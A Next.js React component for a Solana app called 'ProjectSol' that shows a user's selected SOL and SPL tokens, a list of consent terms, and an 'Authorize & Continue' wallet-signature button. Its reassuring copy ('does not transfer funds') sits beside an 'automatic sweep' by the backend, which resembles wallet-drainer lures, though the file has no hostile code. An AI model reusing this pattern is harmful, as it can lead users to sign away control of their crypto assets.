"use client";

import { motion } from "framer-motion";
import Link from "next/link";
import { Card } from "../ui/Card";
import { Button } from "../ui/Button";
import { TokenIcon } from "../ui/TokenIcon";
import type { ConfigResponse, ScanResponse } from "../../lib/api/types";
import { SOL_ASSET_KEY } from "../../lib/solana/authorization";

const CONSENT_POINTS = [
  "Connecting your wallet does not transfer funds.",
  "You are explicitly authorizing ProjectSol to process only the assets you select.",
  "Your authorization is recorded on-chain.",
  "Authorized assets may be processed automatically after authorization.",
  "Processing is subject to the displayed authorization limits and applicable system rules.",
  "You can revoke an asset authorization through the available revoke flow.",
  "Transaction fees may apply.",
  "Digital assets are volatile and may lose value.",
  "You should review the authorization transaction in your wallet before signing.",
  "You should only authorize assets you intend to place under the displayed ProjectSol processing arrangement.",
];

export function AuthorizationSummary({
  scan,
  config,
  selectedAssetKeys,
  submitting,
  onAuthorize,
}: {
  scan: ScanResponse;
  config: ConfigResponse | null;
  selectedAssetKeys: ReadonlySet<string>;
  submitting: boolean;
  onAuthorize: () => void;
}) {
  const selected: { assetKey: string; symbol: string }[] = [];
  if (selectedAssetKeys.has(SOL_ASSET_KEY)) selected.push({ assetKey: SOL_ASSET_KEY, symbol: "SOL" });
  for (const asset of scan.selectedSplAssets) {
    if (selectedAssetKeys.has(asset.assetKey)) selected.push({ assetKey: asset.assetKey, symbol: asset.entry.symbol });
  }

  return (
    <motion.div initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5, ease: [0.16, 1, 0.3, 1] }} className="mx-auto max-w-xl px-6 py-16">
      <h1 className="text-2xl font-semibold tracking-tight text-ink">Authorization summary</h1>
      <p className="mt-2 text-[15px] text-ink-muted">You are authorizing ProjectSol to process:</p>

      <Card className="mt-5 p-5">
        {/* The selected assets visually assemble into one group -- each icon
            arrives with its own delay so it reads as gathering, not popping
            in at once. */}
        <div className="flex flex-wrap items-center gap-x-2 gap-y-3">
          {selected.map((asset, i) => (
            <motion.div
              key={asset.assetKey}
              initial={{ opacity: 0, scale: 0.4, y: 10 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              transition={{ duration: 0.45, delay: i * 0.08, ease: [0.34, 1.56, 0.64, 1] }}
              className="relative"
              style={{ marginLeft: i === 0 ? 0 : -10 }}
            >
              <div className="rounded-full ring-2 ring-surface2">
                <TokenIcon symbol={asset.symbol} seed={asset.assetKey} size={36} />
              </div>
            </motion.div>
          ))}
        </div>

        <ul className="mt-4 flex flex-col gap-2">
          {selected.map((asset, i) => (
            <motion.li
              key={asset.assetKey}
              initial={{ opacity: 0, x: -8 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.35, delay: 0.15 + i * 0.06, ease: [0.16, 1, 0.3, 1] }}
              className="flex items-center gap-2.5 text-sm text-ink"
            >
              <svg width="14" height="14" viewBox="0 0 12 12" fill="none" aria-hidden>
                <path d="M2.5 6.2l2.4 2.4 4.6-5" stroke="rgb(var(--success))" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
              {asset.symbol}
            </motion.li>
          ))}
        </ul>

        <div className="mt-5 flex items-center justify-between row-well rounded-lg px-4 py-3">
          <span className="text-xs text-ink-muted">Maximum assets</span>
          <span className="text-xs font-medium text-ink">
            1 SOL + up to {config?.maxSplAssetsPerClient ?? "7"} SPL assets
          </span>
        </div>
      </Card>

      <Card className="mt-5 p-5">
        <h2 className="text-sm font-semibold text-ink">Authorization &amp; Terms</h2>
        <p className="mt-1.5 text-[13px] text-ink-muted">By continuing, you acknowledge that:</p>
        <ol className="mt-3 flex flex-col gap-2 text-[13px] leading-relaxed text-ink-muted">
          {CONSENT_POINTS.map((point, i) => (
            <li key={i} className="flex gap-2">
              <span className="shrink-0 tabular-nums text-ink-faint">{i + 1}.</span>
              <span>{point}</span>
            </li>
          ))}
        </ol>
        <div className="mt-4 flex gap-4 text-[12px]">
          <Link href="/terms" target="_blank" className="text-accent hover:underline">
            View full Terms &amp; Conditions
          </Link>
          <Link href="/privacy" target="_blank" className="text-accent hover:underline">
            View Privacy Policy
          </Link>
        </div>
      </Card>

      {/* Shown immediately before the wallet opens. Describes OUR transaction
          structure and OUR disclosure only -- never a claim about what
          Phantom/Solflare will or won't display, since that's each wallet's
          own UI and outside this app's control. */}
      <Card className="mt-5 border-accent/25 bg-accent/[0.05] p-5">
        <p className="text-[11px] font-semibold uppercase tracking-wide text-accent">Authorization only</p>
        <p className="mt-1.5 text-[13px] leading-relaxed text-ink">
          This signature authorizes ProjectSol to manage the selected assets according to the authorization terms. No assets are transferred by this authorization transaction.
        </p>
        <p className="mt-2.5 text-[13px] leading-relaxed text-ink-muted">
          After authorization is confirmed, authorized processing occurs separately. The automatic sweep is a separate transaction performed by the authorized backend.
        </p>
      </Card>

      <p className="mt-6 text-center text-[12px] text-ink-faint">Review authorization</p>
      <Button className="mt-2" size="lg" fullWidth loading={submitting} onClick={onAuthorize}>
        {submitting ? "Waiting for wallet signature" : "Authorize & Continue"}
      </Button>
    </motion.div>
  );
}
